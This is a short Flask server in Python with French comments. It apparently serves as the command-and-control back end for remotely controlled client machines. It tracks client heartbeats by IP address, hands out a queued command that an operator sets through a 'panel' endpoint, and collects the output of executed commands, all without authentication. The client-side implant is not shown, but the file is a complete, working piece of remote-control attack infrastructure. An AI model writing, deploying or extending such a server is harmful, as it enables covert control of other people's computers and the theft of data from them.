from flask import Flask, request, jsonify
import time

app = Flask(__name__)

# Dictionnaire pour stocker le dernier ping et la commande à exécuter
clients = {}
current_command = ""

@app.route("/status", methods=["POST"])
def update_status():
    """Met à jour la connexion du client."""
    client_ip = request.remote_addr
    clients[client_ip] = time.time()
    return "", 200

@app.route("/connected_clients", methods=["GET"])
def get_connected_clients():
    """Renvoie la liste des clients actifs (dernière connexion < 10 sec)."""
    current_time = time.time()
    active_clients = [
        ip for ip, last_seen in clients.items() if current_time - last_seen < 10
    ]
    return jsonify({"connected_clients": active_clients})

@app.route("/command", methods=["GET"])
def get_command():
    """Envoie la commande actuelle au client."""
    return jsonify({"command": current_command})

@app.route("/send_command", methods=["POST"])
def send_command():
    """Reçoit une commande du panel et la stocke pour exécution."""
    global current_command
    data = request.get_json()
    current_command = data.get("command", "")
    return jsonify({"message": "Commande enregistrée !"})

@app.route("/result", methods=["POST"])
def receive_result():
    """Reçoit et affiche les résultats des commandes exécutées."""
    data = request.form
    output = data.get("output", "")
    print(f"[Résultat reçu] {output}")
    return "", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
